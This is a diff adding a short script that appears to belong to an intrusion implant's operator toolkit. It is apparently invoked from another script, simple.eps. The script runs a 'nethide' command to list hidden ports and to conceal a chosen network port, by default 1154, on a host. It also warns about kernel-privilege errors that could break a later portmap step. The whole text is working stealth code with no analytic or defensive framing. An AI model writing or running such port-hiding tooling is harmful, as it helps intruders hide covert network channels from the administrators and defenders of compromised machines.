@@ -1,0 +1,39 @@
+# Called from simple.eps
+##########################################################################################
+# xx xxxxxx xx - Next iterations of changes....
+#
+##########################################################################################
+
+
+string $portToHide="1154";
+bool $showUsage=false;
+
+if ($argc > 2) { $showUsage = true; } 
+if ($argc >= 2) {
+	if ($argv[1] == "?") { $showUsage = true; } 
+	else { $portToHide=$argv[1]; }
+}
+
+ifnot (prompt `nethide -list`){
+	@echo off;
+	`lpsetenv -option NhStatus -value "FAILED"`;
+	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~";
+	echo "Note the Error, if there are no hidden ports,";
+	echo "it's not really an error and you can continue this script.";
+	echo "";
+	echo "If it's a privilegeRunInKernelMode error, or a ";
+	echo "0xffffffff error, odds are portmap will fail later.";
+	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~";
+	ifnot (prompt "Continue this script?"){ return false; }
+}
+
+ifnot (prompt "Do you need to hide a port?") {
+	return true;
+}
+ifnot (prompt "Do you want to hide $portToHide?") {
+	$portToHide=GetInput("What port do you want to hide?");
+}
+`nethide -hide $portToHide`;
+`nethide -list`;
+
+return true;
